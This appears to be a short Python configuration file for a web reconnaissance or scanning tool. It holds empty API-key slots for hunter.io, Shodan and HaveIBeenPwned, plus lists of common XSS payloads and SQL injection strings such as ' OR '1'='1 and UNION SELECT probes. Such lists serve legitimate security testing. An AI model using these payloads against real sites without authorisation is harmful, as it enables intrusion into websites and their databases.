


keys = {
    'hunter' : '', # hunter.io
    'shodan' : '', # shodan
    'pwnd' : '', # HaveIBeenPwned
}
















# List of common XSS payloads
xss_payloads = [
    "<script>alert('XSS')</script>",
    "'\"><script>alert('XSS')</script>",
    "\"><svg/onload=alert('XSS')>",
]



# List of payloads to test for SQL Injection
sql_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    '" OR "1"="1',
    '" OR "1"="1" --',
    '" OR "1"="1" #',
    "' UNION SELECT NULL, NULL, NULL --",
    '" UNION SELECT NULL, NULL, NULL --'
]